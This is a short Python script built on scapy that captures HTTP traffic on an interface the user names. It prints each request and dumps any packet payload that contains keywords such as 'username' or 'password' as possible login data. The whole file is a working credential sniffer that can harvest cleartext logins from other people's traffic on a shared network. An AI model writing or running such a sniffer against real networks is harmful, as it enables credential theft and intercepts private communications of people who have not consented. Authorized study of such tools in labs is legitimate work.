from scapy.all import sniff, IP, TCP, Raw
from scapy.layers.http import HTTPRequest  # Import HTTP packet

# Packet Analysis
def packet_callback(packet):
    if packet.haslayer(HTTPRequest):
        http_layer = packet[HTTPRequest]
        ip_layer = packet[IP]

        print(f"\n[*] New HTTP Request [{ip_layer.src} -> {ip_layer.dst}]")
        print(f"[+] {http_layer.Method.decode()} {http_layer.Host.decode()}{http_layer.Path.decode()}")

        if packet.haslayer(Raw):
            load = packet[Raw].load.decode(errors='ignore')
            # Search for possible login data
            keywords = ['username', 'user', 'login', 'password', 'pass']
            if any(keyword in load for keyword in keywords):
                print(f"\n[*] Possible login info: {load}\n")

# Request the interface name from the user
iface = input("Please enter the network interface name (e.g., eth0, wlan0): ")

# Capture packets on the interface entered by the user
sniff(iface=iface, prn=packet_callback, store=False)
